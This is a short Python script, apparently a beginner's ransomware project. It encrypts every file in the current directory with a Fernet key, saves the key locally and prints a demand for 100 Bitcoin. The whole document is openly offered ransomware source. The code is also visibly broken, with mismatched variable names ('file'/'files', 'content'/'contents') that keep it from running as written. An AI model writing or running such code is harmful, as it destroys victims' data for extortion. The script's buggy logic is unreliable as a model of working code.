import os
from cryptography.fernet import Fernet

#Find Files

file = []

for file in os.listdir():
    if file == "ransomware_project.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print (files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(files, "rb") as thefile:
        content = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("You Have Been Hacked! Transfer 100 Bitcoin to gain access to your files hahaha")
